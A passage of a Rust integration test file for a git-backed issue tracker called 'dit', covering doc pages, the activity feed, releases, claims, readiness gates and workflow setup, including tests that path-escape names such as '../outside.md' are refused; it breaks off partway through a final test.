fn migrate_layout_refuses_when_the_layout_is_already_current() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    // The `workspace()` fixture carries no legacy `.dit/issues/`, so it
    // detects as the root layout already.
    let err = dit.migrate_layout(DataLayout::Root).unwrap_err();
    assert!(err.to_string().contains("already"), "{err}");
}

// -- doc pages (§13; file-backed reads per ADR 0010) -------------------------

#[test]
fn a_saved_doc_lands_as_one_commit_and_reads_back() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let repo = Repo::open(tmp.path()).unwrap();

    let mut tx = dit.transaction("farid").unwrap();
    tx.write_doc(
        "docs/adr-0010-doc-editor.md",
        "# Doc editor

Page   text.
",
    )
    .unwrap();
    let head = tx
        .commit("dit docs save: docs/adr-0010-doc-editor.md")
        .unwrap()
        .expect("one commit for one save");

    // The file exists, reads back canonically formatted, and the commit
    // message names it.
    let text = dit.read_doc("docs/adr-0010-doc-editor.md").unwrap();
    assert!(text.starts_with("# Doc editor"), "{text}");
    assert_eq!(text, dit_parse::fmt::fmt(&text).unwrap());
    let subject = repo
        .log_lines(format!("{head}~1..{head}").as_str(), "%s")
        .unwrap();
    assert_eq!(
        subject,
        vec!["dit docs save: docs/adr-0010-doc-editor.md".to_owned()]
    );

    // The listing sees it, with display metadata from the filesystem.
    let docs = dit.list_docs();
    let paths: Vec<&str> = docs.iter().map(|d| d.path.as_str()).collect();
    assert_eq!(paths, vec!["docs/adr-0010-doc-editor.md"]);
    assert!(docs[0].bytes > 0, "size comes from the file");
}

#[test]
fn a_deleted_doc_disappears_in_one_commit() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    tx.write_doc(
        "notes/scratch.md",
        "# Scratch
",
    )
    .unwrap();
    tx.commit("dit docs save: notes/scratch.md").unwrap();

    let mut tx = dit.transaction("farid").unwrap();
    tx.delete_doc("notes/scratch.md").unwrap();
    tx.commit("dit docs delete: notes/scratch.md").unwrap();

    assert!(dit.list_docs().is_empty());
    let err = dit.read_doc("notes/scratch.md").unwrap_err();
    assert!(matches!(err, DitError::NotFound(_)), "{err}");
    assert!(!tmp.path().join("notes/scratch.md").exists());
}

#[test]
fn a_moved_doc_carries_its_content_and_history_in_one_commit() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    tx.write_doc(
        "docs/flows/auth.md",
        "# Auth

body text
",
    )
    .unwrap();
    tx.commit("dit docs save: docs/flows/auth.md").unwrap();

    let mut tx = dit.transaction("farid").unwrap();
    tx.move_doc("docs/flows/auth.md", "notes/auth.md").unwrap();
    tx.commit("dit docs move: docs/flows/auth.md -> notes/auth.md")
        .unwrap();

    // The new location serves the exact bytes; the old one is gone.
    assert_eq!(
        dit.read_doc("notes/auth.md").unwrap(),
        "# Auth

body text
"
    );
    assert!(matches!(
        dit.read_doc("docs/flows/auth.md").unwrap_err(),
        DitError::NotFound(_)
    ));
    let listed = dit.list_docs();
    let paths: Vec<&str> = listed.iter().map(|d| d.path.as_str()).collect();
    assert_eq!(paths, vec!["notes/auth.md"]);
    assert!(!dit.status().dirty);

    // Git recorded it as a rename, so the page's history follows it — the
    // same guarantee the layout migration gives (ADR 0005).
    let rename = std::process::Command::new("git")
        .args(["log", "-1", "--name-status", "--format="])
        .current_dir(tmp.path())
        .output()
        .unwrap();
    assert_eq!(
        String::from_utf8_lossy(&rename.stdout).trim(),
        "R100\tdocs/flows/auth.md\tnotes/auth.md",
        "the move must be one rename commit, not delete-plus-create"
    );
}

#[test]
fn moving_a_doc_onto_an_existing_page_is_refused_without_writing() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    tx.write_doc(
        "docs/a.md",
        "# A
",
    )
    .unwrap();
    tx.write_doc(
        "notes/b.md",
        "# B
",
    )
    .unwrap();
    tx.commit("dit docs save: two pages").unwrap();

    let mut tx = dit.transaction("farid").unwrap();
    let err = tx.move_doc("docs/a.md", "notes/b.md").unwrap_err();
    assert!(matches!(err, DitError::Refuse(_)), "{err}");
    tx.abort();

    // A refused move writes nothing: both pages intact, tree clean.
    assert_eq!(
        dit.read_doc("docs/a.md").unwrap(),
        "# A
"
    );
    assert_eq!(
        dit.read_doc("notes/b.md").unwrap(),
        "# B
"
    );
    assert!(!dit.status().dirty);
}

#[test]
fn moving_a_missing_doc_is_not_found_and_a_self_move_is_a_no_op() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    tx.write_doc(
        "docs/stay.md",
        "# Stay
",
    )
    .unwrap();
    tx.commit("dit docs save: docs/stay.md").unwrap();

    let mut tx = dit.transaction("farid").unwrap();
    assert!(matches!(
        tx.move_doc("docs/ghost.md", "notes/ghost.md").unwrap_err(),
        DitError::NotFound(_)
    ));
    tx.abort();

    // Renaming a page onto itself stages nothing — no commit, no error.
    let mut tx = dit.transaction("farid").unwrap();
    tx.move_doc("docs/stay.md", "docs/stay.md").unwrap();
    let commit = tx.commit("dit docs move: self").unwrap();
    assert!(
        commit.is_none(),
        "a self-move must not be a commit: {commit:?}"
    );
}

#[test]
fn doc_paths_are_sandboxed_at_the_facade() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    for escape in [
        "../outside.md",
        "issues/2026/08/x-readme/readme.md",
        ".dit/config.yaml",
        "docs/../notes/x.md",
    ] {
        let mut tx = dit.transaction("farid").unwrap();
        let err = tx
            .write_doc(
                escape, "# nope
",
            )
            .unwrap_err();
        assert!(!err.to_string().is_empty(), "{escape} refused: {err}");
        tx.abort();
    }
    // Nothing escaped: no doc roots, nothing outside the workspace.
    assert!(dit.list_docs().is_empty());
    assert!(!tmp.path().parent().unwrap().join("outside.md").exists());
}

#[test]
fn list_docs_skips_names_the_editor_cannot_address() {
    // Hand-made files with names outside the DocPath rules (uppercase,
    // dotfiles) must not break the listing — they are simply not editable
    // through the doc editor until renamed.
    let tmp = tempfile::tempdir().unwrap();
    let dit = workspace(tmp.path());
    std::fs::create_dir_all(tmp.path().join("docs")).unwrap();
    std::fs::write(
        tmp.path().join("docs/good.md"),
        "# good
",
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("docs/BAD-NAME.MD"),
        "# bad
",
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("docs/.secret.md"),
        "# hidden
",
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("docs/notes.txt"),
        "not markdown
",
    )
    .unwrap();

    let docs = dit.list_docs();
    let paths: Vec<&str> = docs.iter().map(|d| d.path.as_str()).collect();
    assert_eq!(paths, vec!["docs/good.md"]);
}

#[test]
fn the_activity_feed_and_time_travel_read_the_whole_workspace() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());

    let mut tx = dit.transaction("farid").unwrap();
    let first = tx.create_issue(draft("Login timeout")).unwrap();
    tx.commit("create the first issue").unwrap();
    // The board as it stood right after the first issue was created.
    let after_first = dit.activity(None, 10).unwrap()[0].seq;

    let mut tx = dit.transaction("budi").unwrap();
    let second = tx
        .create_issue(draft("Merge driver drops changes"))
        .unwrap();
    tx.commit("create the second issue").unwrap();

    let mut tx = dit.transaction("budi").unwrap();
    tx.set_fields(
        &first,
        FieldPatch {
            status: Some("done".into()),
            ..FieldPatch::default()
        },
    )
    .unwrap();
    tx.commit("finish the first issue").unwrap();

    // The feed spans issues, newest first, and pages by cursor.
    let page = dit.activity(None, 2).unwrap();
    assert_eq!(page.len(), 2);
    assert!(page[0].seq > page[1].seq, "newest first");
    let next = dit.activity(Some(page[1].seq), 50).unwrap();
    assert!(
        next.iter().all(|e| e.seq < page[1].seq),
        "the cursor never repeats a row"
    );
    let ids: std::collections::HashSet<_> = dit
        .activity(None, 100)
        .unwrap()
        .into_iter()
        .map(|e| e.issue_id)
        .collect();
    assert!(ids.contains(first.as_str()) && ids.contains(second.as_str()));

    // Now: two issues, one of them finished.
    let now = dit.activity_summary(None, 365).unwrap();
    assert_eq!(now.now.done, 1);
    assert_eq!(now.now.todo, 1);
    assert_eq!(now.seq, now.max_seq, "no cutoff means the end of history");

    // Then: only the first issue existed, and it was not done yet.
    let then = dit.activity_summary(Some(after_first), 365).unwrap();
    assert_eq!(then.at_cutoff.todo, 1);
    assert_eq!(then.at_cutoff.done, 0);
    assert_eq!(then.now.done, 1, "now is always now, whatever the cutoff");
    assert_eq!(then.since.created, 1, "the second issue was born after");
    assert_eq!(then.since.finished, 1);
    assert!(then.since.touched >= 2);

    // The histogram covers the days work actually happened on.
    assert!(!now.days.is_empty());
    assert_eq!(
        now.days.iter().map(|d| d.count).sum::<usize>(),
        dit.activity(None, 500).unwrap().len()
    );

    // A cutoff past the end is clamped rather than inventing a future.
    let clamped = dit.activity_summary(Some(9_999), 365).unwrap();
    assert_eq!(clamped.seq, clamped.max_seq);
}

#[test]
fn a_start_date_is_stored_queried_and_read_back() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());

    let mut tx = dit.transaction("farid").unwrap();
    let id = tx
        .create_issue(draft("Index rebuild after force push"))
        .unwrap();
    tx.commit("create").unwrap();

    let mut tx = dit.transaction("farid").unwrap();
    tx.set_fields(
        &id,
        FieldPatch {
            start: Some("2026-09-20".into()),
            due: Some("2026-09-30".into()),
            ..FieldPatch::default()
        },
    )
    .unwrap();
    tx.commit("schedule it").unwrap();

    // Read path: the index carries it, not just the file.
    let stored = dit.get(id.as_str()).unwrap().unwrap();
    assert_eq!(stored.issue.start.as_deref(), Some("2026-09-20"));
    assert_eq!(stored.issue.due.as_deref(), Some("2026-09-30"));

    // Query path: the field is a real column the index can filter on. DQL
    // date comparisons take relative dates (`start <= +7d`), which the query
    // crate pins against an injected clock; here the point is only that the
    // field reached the index at all.
    assert_eq!(dit.query("start <= +3650d", None).unwrap().len(), 1);

    // History path: scheduling is a change like any other, so the Gantt's
    // drag is auditable rather than silent.
    let events = dit.history(&id, Some("start")).unwrap();
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(events[0].new_value.as_deref(), Some("2026-09-20"));
    assert_eq!(events[0].author, "farid");

    // The tree is clean: one commit wrote both fields.
    assert!(!dit.status().dirty);
}

#[test]
fn recent_comments_span_issues_newest_first() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());

    let mut tx = dit.transaction("farid").unwrap();
    let a = tx.create_issue(draft("Login timeout")).unwrap();
    let b = tx
        .create_issue(draft("Merge driver drops changes"))
        .unwrap();
    tx.commit("create 2 issues").unwrap();

    // Nothing yet: an empty feed, not an error.
    assert!(dit.recent_comments(10).unwrap().is_empty());

    let mut tx = dit.transaction("farid").unwrap();
    tx.comment(&a, "farid", None, "first on a").unwrap();
    tx.commit("comment").unwrap();
    let mut tx = dit.transaction("budi").unwrap();
    tx.comment(&b, "budi", None, "then on b").unwrap();
    tx.commit("comment").unwrap();

    let feed = dit.recent_comments(10).unwrap();
    assert_eq!(feed.len(), 2, "{feed:?}");
    // Newest first, each row naming the issue it belongs to.
    assert_eq!(feed[0].issue_id, b);
    assert_eq!(feed[0].title, "Merge driver drops changes");
    assert_eq!(feed[0].comment.author, "budi");
    assert_eq!(feed[1].issue_id, a);
    assert_eq!(feed[1].comment.body.trim(), "first on a");
    assert_eq!(dit.recent_comments(1).unwrap().len(), 1);
}

const RELEASE_FILE: &str = "---
version: v0.2.0
status: in_uat
target_ref: release/0.2.0
repo: api
target: 2026-10-01
includes:
  - 01K3M9ZXQ2R7VN8P4TDBCEFGHJ
approved_by: qa-lead
---

Ships the login flow.
";

/// Commit a release plan the way `dit release plan` (v0.9) eventually will —
/// by hand, through git, because the read model ships before the writer.
fn commit_release(root: &Path, version: &str, text: &str) {
    let dir = root.join(".dit/releases").join(version);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("release.md"), text).unwrap();
    let repo = Repo::open(root).unwrap();
    repo.add(".dit/releases").unwrap();
    repo.commit(&format!("plan {version}")).unwrap();
}

#[test]
fn a_workspace_without_releases_answers_with_an_empty_list() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    assert!(dit.releases().unwrap().is_empty());
    assert!(dit.release("v0.2.0").unwrap().is_none());
    // A full rebuild over a tree with no `.dit/releases/` is fine too.
    dit.reindex(ReindexMode::All).unwrap();
    assert!(dit.releases().unwrap().is_empty());
    // And patching a plan that does not exist is NotFound, not a crash.
    let mut tx = dit.transaction("farid").unwrap();
    let err = tx
        .set_release(
            "v0.2.0",
            dit_model::ReleasePatch {
                status: Some(dit_model::ReleaseStatus::Released),
                target: None,
            },
        )
        .unwrap_err();
    assert!(matches!(err, DitError::NotFound(_)), "{err}");
}

#[test]
fn releases_are_indexed_from_git_and_patched_in_one_commit() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    commit_release(tmp.path(), "v0.2.0", RELEASE_FILE);
    commit_release(
        tmp.path(),
        "v0.1.0",
        "---
version: v0.1.0
status: released
target: 2026-09-01
---
",
    );
    commit_release(
        tmp.path(),
        "v1.0.0",
        "---
version: v1.0.0
status: planned
---
",
    );

    // Hand-made commits are not absorbed by a transaction; a rebuild is.
    dit.reindex(ReindexMode::All).unwrap();
    let versions: Vec<String> = dit
        .releases()
        .unwrap()
        .into_iter()
        .map(|r| r.release.version)
        .collect();
    assert_eq!(
        versions,
        ["v0.1.0", "v0.2.0", "v1.0.0"],
        "dated first, then by version"
    );
    let plan = dit.release("v0.2.0").unwrap().expect("indexed");
    assert_eq!(plan.release.status, dit_model::ReleaseStatus::InUat);
    assert_eq!(plan.release.target.as_deref(), Some("2026-10-01"));
    assert_eq!(plan.release.includes.len(), 1);
    assert_eq!(plan.path, ".dit/releases/v0.2.0/release.md");

    // One patch, one commit, attributed to the person who acted.
    let head_before = Repo::open(tmp.path()).unwrap().head().unwrap();
    let mut tx = dit.transaction("farid").unwrap();
    tx.set_release(
        "v0.2.0",
        dit_model::ReleasePatch {
            status: Some(dit_model::ReleaseStatus::Released),
            target: Some("2026-10-03".into()),
        },
    )
    .unwrap();
    let sha = tx.commit("release v0.2.0: released").unwrap().unwrap();
    assert_ne!(sha, head_before);
    let repo = Repo::open(tmp.path()).unwrap();
    let message = repo.git(&["log", "-1", "--format=%B", &sha]).unwrap();
    assert!(message.contains("Dit-Author: farid"), "{message}");
    assert!(
        repo.is_clean().unwrap(),
        "the write is committed, not left dirty"
    );

    // The index absorbed the commit; the file kept what it did not touch.
    let plan = dit.release("v0.2.0").unwrap().expect("still indexed");
    assert_eq!(plan.release.status, dit_model::ReleaseStatus::Released);
    assert_eq!(plan.release.target.as_deref(), Some("2026-10-03"));
    assert_eq!(plan.release.target_ref.as_deref(), Some("release/0.2.0"));
    let on_disk =
        std::fs::read_to_string(tmp.path().join(".dit/releases/v0.2.0/release.md")).unwrap();
    assert!(on_disk.contains("approved_by: qa-lead"), "{on_disk}");
    assert!(on_disk.contains("Ships the login flow."), "{on_disk}");

    // Release files never masquerade as issues or events.
    assert!(dit.query("", None).unwrap().is_empty());
    assert!(dit.activity(None, 100).unwrap().is_empty());

    // The date is validated at the write boundary — nothing lands.
    let mut tx = dit.transaction("farid").unwrap();
    assert!(tx
        .set_release(
            "v0.2.0",
            dit_model::ReleasePatch {
                status: None,
                target: Some("soon".into()),
            },
        )
        .is_err());
}

#[test]
fn the_alias_is_persisted_per_clone_and_validated() {
    let tmp = tempfile::tempdir().unwrap();
    let dit = workspace(tmp.path());
    assert_eq!(dit.me(), None, "nothing configured yet");

    dit.set_me("farid").unwrap();
    assert_eq!(dit.me().as_deref(), Some("farid"));
    // Survives a reopen: it is the clone's setting, not the process's.
    assert_eq!(
        Dit::open(tmp.path()).unwrap().me().as_deref(),
        Some("farid")
    );
    // The surrounding whitespace is not part of the alias.
    dit.set_me("  budi ").unwrap();
    assert_eq!(dit.me().as_deref(), Some("budi"));

    // An alias that could not name a comment file is refused, so a later
    // comment never fails on it.
    for bad in ["", "   ", "Farid", "far id", "../x"] {
        let err = dit.set_me(bad).unwrap_err();
        assert!(matches!(err, DitError::Refuse(_)), "{bad:?}: {err}");
    }
    assert_eq!(
        dit.me().as_deref(),
        Some("budi"),
        "a refusal changes nothing"
    );
    // The setting is not workspace data: the tree stays clean.
    assert!(Repo::open(tmp.path()).unwrap().is_clean().unwrap());
}

#[test]
fn clearing_a_field_removes_it_from_the_file_and_the_index() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft("Has a due date")).unwrap();
    tx.commit("create").unwrap();

    let mut tx = dit.transaction("farid").unwrap();
    tx.set_fields(
        &id,
        FieldPatch {
            due: Some("2026-09-01".into()),
            ..FieldPatch::default()
        },
    )
    .unwrap();
    tx.commit("set due").unwrap();
    let path = tmp.path().join(dit.get(id.as_str()).unwrap().unwrap().path);
    assert!(std::fs::read_to_string(&path)
        .unwrap()
        .contains("due: 2026-09-01"));

    let mut tx = dit.transaction("farid").unwrap();
    tx.set_fields(
        &id,
        FieldPatch {
            clear: vec![
                dit_model::ClearableField::Due,
                dit_model::ClearableField::Priority,
            ],
            ..FieldPatch::default()
        },
    )
    .unwrap();
    tx.commit("clear due").unwrap();

    let text = std::fs::read_to_string(&path).unwrap();
    assert!(!text.contains("due:"), "{text}");
    assert!(!text.contains("priority:"), "{text}");
    let stored = dit.get(id.as_str()).unwrap().unwrap().issue;
    assert_eq!(stored.due, None);
    assert_eq!(stored.priority, None);
    // History records the removal as a change to nothing.
    let events = dit.history(&id, Some("due")).unwrap();
    let last = events.last().unwrap();
    assert_eq!(last.old_value.as_deref(), Some("2026-09-01"));
    assert_eq!(last.new_value, None);
}

#[test]
fn deleting_an_issue_removes_its_files_but_keeps_its_history() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    let doomed = tx.create_issue(draft("Doomed")).unwrap();
    let survivor = tx.create_issue(draft("Survivor")).unwrap();
    tx.comment(&doomed, "farid", None, "last words").unwrap();
    tx.commit("create").unwrap();
    let folder = tmp
        .path()
        .join(dit.get(doomed.as_str()).unwrap().unwrap().path)
        .parent()
        .unwrap()
        .to_path_buf();
    assert!(folder.join("comments").is_dir());
    let events_before = dit.history(&doomed, None).unwrap().len();
    assert!(events_before > 0);

    let mut tx = dit.transaction("farid").unwrap();
    tx.delete_issue(&doomed).unwrap();
    let sha = tx.commit("delete doomed").unwrap().expect("one commit");
    let repo = Repo::open(tmp.path()).unwrap();
    assert!(repo.is_clean().unwrap(), "the deletion is committed");
    assert!(repo
        .git(&["log", "-1", "--format=%B", &sha])
        .unwrap()
        .contains("Dit-Author: farid"));

    // Files and folder gone; the other issue untouched.
    assert!(!folder.exists(), "{}", folder.display());
    assert!(dit.get(survivor.as_str()).unwrap().is_some());
    // The index dropped the row and its comments…
    assert!(dit.get(doomed.as_str()).unwrap().is_none());
    assert!(dit.comments(&doomed).unwrap().is_empty());
    assert_eq!(dit.query("", None).unwrap().len(), 1);
    assert!(dit.recent_comments(10).unwrap().is_empty());
    // …but history outlives its subject, and the deletion is itself an event.
    let events = dit.history(&doomed, Some("status")).unwrap();
    assert!(events.len() > 1, "{events:?}");
    assert_eq!(events.last().unwrap().new_value, None, "removed → nothing");

    // Deleting what is not there is NotFound; a full rebuild agrees.
    let mut tx = dit.transaction("farid").unwrap();
    assert!(matches!(
        tx.delete_issue(&doomed),
        Err(DitError::NotFound(_))
    ));
    drop(tx);
    dit.reindex(ReindexMode::All).unwrap();
    assert!(dit.get(doomed.as_str()).unwrap().is_none());
    assert_eq!(dit.query("", None).unwrap().len(), 1);
}

// -- ADR 0015/0018: the coordination plane -----------------------------------

use dit_core::{spawn_watcher, ClaimOptions, LaneSpec};

fn issue_with(dit: &mut Dit, title: &str, patch: dit_core::FieldPatch) -> dit_core::IssueId {
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft(title)).unwrap();
    tx.set_fields(&id, patch).unwrap();
    tx.commit("create").unwrap().unwrap();
    id
}

#[test]
fn resolve_rejects_duplicate_numbers_naming_both_candidates() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let a = issue_with(
        &mut dit,
        "First holder of 285",
        dit_core::FieldPatch {
            number: Some(285),
            ..Default::default()
        },
    );
    let b = issue_with(
        &mut dit,
        "Second holder of 285",
        dit_core::FieldPatch {
            number: Some(285),
            ..Default::default()
        },
    );
    let err = dit.resolve("#285").unwrap_err();
    match err {
        DitError::Ambiguous { listing, .. } => {
            assert!(listing.contains(a.as_str()), "{listing}");
            assert!(listing.contains(b.as_str()), "{listing}");
            assert!(listing.contains("Second holder"), "{listing}");
        }
        other => panic!("expected Ambiguous, got {other:?}"),
    }
    // The short ref stays unambiguous and resolves exactly.
    assert_eq!(dit.resolve(a.short_ref().as_str()).unwrap(), a);
    assert_eq!(dit.resolve(b.as_str()).unwrap(), b);
    assert!(matches!(dit.resolve("#99"), Err(DitError::NotFound(_))));
}

#[test]
fn claim_guards_readiness_exclusivity_and_renewal() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let blocker = issue_with(&mut dit, "Backend endpoint", Default::default());
    let waiter = issue_with(
        &mut dit,
        "Frontend integration",
        dit_core::FieldPatch {
            blocked_by: Some(vec![blocker]),
            ..Default::default()
        },
    );

    // Blocked: the waiter cannot claim while the blocker is not through the gate.
    let err = dit
        .claim(&waiter, "fe-1", ClaimOptions::default())
        .unwrap_err();
    assert!(
        err.to_string().contains("blockers not through the gate"),
        "{err}"
    );
    assert!(
        err.to_string().contains(blocker.short_ref().as_str()),
        "{err}"
    );

    // Through the gate: claim lands as one commit and is readable back.
    issue_with(
        &mut dit,
        "Backend endpoint",
        dit_core::FieldPatch {
            status: Some("done".into()),
            ..Default::default()
        },
    );
    // The patch above targeted the same issue? No: it created a new one.
    // Mark the actual blocker done.
    let mut tx = dit.transaction("be-1").unwrap();
    tx.set_fields(
        &blocker,
        dit_core::FieldPatch {
            status: Some("done".into()),
            ..Default::default()
        },
    )
    .unwrap();
    tx.commit("blocker done").unwrap();

    dit.claim(&waiter, "fe-1", ClaimOptions::default()).unwrap();
    let got = dit.get(waiter.as_str()).unwrap().unwrap();
    assert_eq!(got.issue.claimed_by.as_deref(), Some("fe-1"));
    assert!(got.issue.claimed_at.is_some());

    // A foreign live claim is refused with the way out named.
    let err = dit
        .claim(&waiter, "be-1", ClaimOptions::default())
        .unwrap_err();
    assert!(err.to_string().contains("--takeover"), "{err}");

    // Own live claim + plain claim again: nothing to write.
    let again = dit.claim(&waiter, "fe-1", ClaimOptions::default()).unwrap();
    assert!(!again.wrote, "{again:?}");

    // Renewal refreshes silently.
    let renew = dit
        .claim(
            &waiter,
            "fe-1",
            ClaimOptions {
                renew: true,
                ..Default::default()
            },
        )
        .unwrap();
    assert!(renew.wrote);

    // Release clears the pair; then another actor can claim.
    dit.claim(
        &waiter,
        "fe-1",
        ClaimOptions {
            release: true,
            ..Default::default()
        },
    )
    .unwrap();
    let got = dit.get(waiter.as_str()).unwrap().unwrap();
    assert_eq!(got.issue.claimed_by, None);
    dit.claim(&waiter, "be-1", ClaimOptions::default()).unwrap();
}

#[test]
fn a_stale_claim_is_takable_and_renew_on_foreign_stale_is_refused() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let id = issue_with(&mut dit, "Abandoned claim", Default::default());
    // Hand-age the claim far past any TTL.
    let mut tx = dit.transaction("fe-1").unwrap();
    tx.set_fields(
        &id,
        dit_core::FieldPatch {
            claimed_by: Some("fe-1".into()),
            claimed_at: Some("2020-01-01T00:00:00Z".into()),
            ..Default::default()
        },
    )
    .unwrap();
    tx.commit("old claim").unwrap();

    // Plain claim by another actor takes the stale claim over.
    dit.claim(&id, "be-1", ClaimOptions::default()).unwrap();
    let got = dit.get(id.as_str()).unwrap().unwrap();
    assert_eq!(got.issue.claimed_by.as_deref(), Some("be-1"));

    // Re-age and try --renew from the foreign actor: refused, naming the move.
    let mut tx = dit.transaction("be-1").unwrap();
    tx.set_fields(
        &id,
        dit_core::FieldPatch {
            claimed_at: Some("2020-01-01T00:00:00Z".into()),
            ..Default::default()
        },
    )
    .unwrap();
    tx.commit("re-age").unwrap();
    let err = dit
        .claim(
            &id,
            "fe-1",
            ClaimOptions {
                renew: true,
                ..Default::default()
            },
        )
        .unwrap_err();
    assert!(err.to_string().contains("stale"), "{err}");
}

#[test]
fn ready_admits_only_what_the_gate_admits() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let blocker = issue_with(
        &mut dit,
        "Backend in review",
        dit_core::FieldPatch {
            status: Some("review".into()),
            ..Default::default()
        },
    );
    let waiter = issue_with(
        &mut dit,
        "Frontend waiting",
        dit_core::FieldPatch {
            blocked_by: Some(vec![blocker]),
            lane: Some("frontend".into()),
            ..Default::default()
        },
    );

    // Default gate (terminal): the review blocker keeps the waiter out.
    let ready = dit.ready(None, None).unwrap();
    assert!(ready.iter().all(|r| r.issue.issue.id != waiter));

    // --until review admits it for this call only.
    let ready = dit.ready(None, Some("review")).unwrap();
    assert!(ready.iter().any(|r| r.issue.issue.id == waiter));

    // Lane filter narrows to the lane's issues.
    let ready = dit.ready(Some("backend"), Some("review")).unwrap();
    assert!(ready.is_empty(), "the blocker is not in the backend lane");

    // An unknown status in --until is a refusal, not an empty answer.
    assert!(dit.ready(None, Some("shipping")).is_err());
}

#[test]
fn status_writes_validate_membership_unless_forced() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let id = issue_with(&mut dit, "Charset was not enough", Default::default());

    let mut tx = dit.transaction("farid").unwrap();
    let err = tx
        .set_fields(
            &id,
            dit_core::FieldPatch {
                status: Some("doing".into()),
                ..Default::default()
            },
        )
        .unwrap_err();
    drop(tx);
    assert!(err.to_string().contains("`doing` is not one of"), "{err}");
    assert!(err.to_string().contains("backlog"), "{err}");

    let mut tx = dit.transaction("farid").unwrap();
    tx.set_fields_opts(
        &id,
        dit_core::FieldPatch {
            status: Some("doing".into()),
            ..Default::default()
        },
        true,
    )
    .unwrap();
    tx.commit("forced write").unwrap();
    assert_eq!(dit.get(id.as_str()).unwrap().unwrap().issue.status, "doing");
}

#[test]
fn refresh_state_absorbs_an_external_commit_once() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let id = issue_with(&mut dit, "Externally edited", Default::default());

    // An external process commits a change to the issue file behind the
    // facade's back: write, add, commit — no absorb happens.
    let path = tmp.path().join(dit.get(id.as_str()).unwrap().unwrap().path);
    let text = std::fs::read_to_string(&path).unwrap();
    let edited = text.replace("status: todo", "status: in_progress");
    std::fs::write(&path, edited).unwrap();
    let repo = dit_vcs::Repo::open(tmp.path()).unwrap();
    let rel = path
        .strip_prefix(tmp.path())
        .unwrap()
        .to_str()
        .unwrap()
        .to_owned();
    repo.add(&rel).unwrap();
    repo.commit("external edit").unwrap();

    // The facade's index is stale; refresh_state brings it in, exactly once.
    assert!(dit.refresh_state().unwrap(), "HEAD moved: rebuild expected");
    assert_eq!(
        dit.get(id.as_str()).unwrap().unwrap().issue.status,
        "in_progress"
    );
    assert!(!dit.refresh_state().unwrap(), "second run: nothing to do");
}

#[test]
fn workflow_init_scaffolds_and_is_idempotent() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let lanes = vec![
        LaneSpec {
            id: "backend".into(),
            label: "Backend".into(),
            owners: vec!["be-1".into()],
        },
        LaneSpec {
            id: "frontend".into(),
            label: "Frontend".into(),
            owners: vec!["fe-1".into()],
        },
    ];
    let first = dit.init_workflow(&lanes).unwrap();
    assert!(first.lanes_written && first.coordination_written);

    let yaml = std::fs::read_to_string(".dit/schema/workflow.yaml")
        .or_else(|_| std::fs::read_to_string(tmp.path().join(".dit/schema/workflow.yaml")))
        .unwrap();
    assert!(yaml.contains("lanes:"), "{yaml}");
    assert!(yaml.contains("id: backend"), "{yaml}");
    assert!(yaml.contains("coordination:"), "{yaml}");

    // Second run: nothing written, hand edits to the schema survive.
    let hand_edited = format!("{yaml}\n# a hand comment stays\n");
    std::fs::write(tmp.path().join(".dit/schema/workflow.yaml"), &hand_edited).unwrap();
    let second = dit.init_workflow(&lanes).unwrap();
    assert_eq!(
        second,
        dit_core::WorkflowInitReport::default(),
        "idempotent: nothing to do"
    );
    let after = std::fs::read_to_string(tmp.path().join(".dit/schema/workflow.yaml")).unwrap();
    assert!(after.contains("# a hand comment stays"), "{after}");

    // The registry is only an ordering hint now (ADR 0019); lane_counts
    // reads the data. Put one issue in each lane and the hint orders them.
    for (title, lane) in [
        ("Serves the flow", "backend"),
        ("Draws the flow", "frontend"),
    ] {
        let mut tx = dit.transaction("farid").unwrap();
        let id = tx.create_issue(draft(title)).unwrap();
        tx.set_fields(
            &id,
            FieldPatch {
                lane: Some(lane.into()),
                ..Default::default()
            },
        )
        .unwrap();
        tx.commit("lane a member").unwrap();
    }
    let counts = dit.lane_counts().unwrap();
    let names: Vec<&str> = counts.iter().map(|(n, _)| n.as_str()).collect();
    assert_eq!(names, vec!["backend", "frontend"], "registry order holds");
}
#[test]
fn the_flow_diagram_computes_stages_edges_and_the_main_path() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();

    // A flow "launch": a -> b -> c in one lane, plus an isolated node d in
    // another lane; and a second flow "audit" sharing node b.
